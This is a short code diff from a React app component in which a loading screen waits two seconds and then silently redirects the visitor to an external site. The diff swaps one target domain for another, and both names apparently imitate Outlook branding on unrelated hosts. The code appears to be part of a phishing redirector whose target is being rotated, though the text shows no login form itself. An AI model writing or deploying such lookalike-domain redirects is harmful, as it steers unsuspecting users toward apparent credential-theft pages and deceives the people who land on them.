@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://buotklook.pressurezone.es/';
+            window.location.href = 'https://outbook.softify-link.ro';
         }, 2000);
 
         return () => clearTimeout(timer);
